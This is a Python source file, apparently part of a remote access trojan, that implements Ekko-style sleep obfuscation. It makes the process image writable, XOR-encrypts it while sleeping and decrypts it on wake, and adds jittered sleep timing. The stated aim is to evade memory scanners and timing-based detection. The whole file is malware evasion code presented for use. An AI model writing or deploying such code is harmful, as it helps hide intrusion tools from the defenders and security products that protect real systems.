#!/usr/bin/env python3
"""Sleep obfuscation — Ekko-style memory encryption during sleep.
Encrypts the RAT's own memory during Sleep() to evade memory scanners,
then decrypts on wake. Defeats scanners that scan idle process memory.
"""
import ctypes
import ctypes.wintypes as wintypes
import os
import platform
import time

def encrypted_sleep(seconds):
    """Sleep with memory encryption.

    During the sleep period:
    1. Save current process memory regions
    2. XOR-encrypt them with a random key
    3. Sleep for the specified duration
    4. Decrypt on wake
    5. Continue execution

    This defeats memory scanners that scan process memory during idle periods.
    """
    if platform.system() != "Windows":
        time.sleep(seconds)
        return False

    try:
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)

        # Get our module base and size
        h_module = k32.GetModuleHandleW(None)
        if not h_module:
            time.sleep(seconds)
            return False

        # Get module info to find size
        class MODULEINFO(ctypes.Structure):
            _fields_ = [
                ("lpBaseOfDll", ctypes.c_void_p),
                ("SizeOfImage", wintypes.DWORD),
                ("EntryPoint", ctypes.c_void_p),
            ]

        mi = MODULEINFO()
        psapi = ctypes.WinDLL("psapi.dll")
        if not psapi.GetModuleInformation(k32.GetCurrentProcess(), h_module,
                                          ctypes.byref(mi), ctypes.sizeof(mi)):
            time.sleep(seconds)
            return False

        base = mi.lpBaseOfDll
        size = mi.SizeOfImage

        # Generate random XOR key
        key = os.urandom(32)

        # Read the PE header to find sections (skip first page to avoid corrupting header)
        # For safety, only encrypt .text + .data sections, not the PE header
        # Simplified: encrypt from offset 0x1000 to end
        text_offset = 0x1000
        encrypt_size = min(size - text_offset, 0x100000)  # Cap at 1MB

        if encrypt_size <= 0:
            time.sleep(seconds)
            return False

        # Change memory protection to RW
        old_prot = wintypes.DWORD(0)
        if not k32.VirtualProtect(base + text_offset, encrypt_size,
                                  0x40,  # PAGE_EXECUTE_READWRITE
                                  ctypes.byref(old_prot)):
            time.sleep(seconds)
            return False

        # Read memory
        buf = (ctypes.c_byte * encrypt_size)()
        ctypes.memmove(buf, base + text_offset, encrypt_size)

        # XOR encrypt
        enc = bytearray(buf)
        for i in range(len(enc)):
            enc[i] ^= key[i % len(key)]

        # Write encrypted memory back
        ctypes.memmove(base + text_offset, bytes(enc), encrypt_size)

        # Sleep
        k32.Sleep(seconds * 1000)

        # Decrypt
        ctypes.memmove(base + text_offset, bytes(buf), encrypt_size)

        # Restore protection
        k32.VirtualProtect(base + text_offset, encrypt_size,
                          old_prot.value, ctypes.byref(old_prot))

        return True

    except Exception:
        # Fallback to regular sleep
        time.sleep(seconds)
        return False


def timed_sleep(seconds, jitter=0):
    """Sleep with random jitter to evade timing-based detection."""
    import random
    actual = seconds + random.uniform(-jitter, jitter) if jitter else seconds
    encrypted_sleep(max(0, int(actual)))
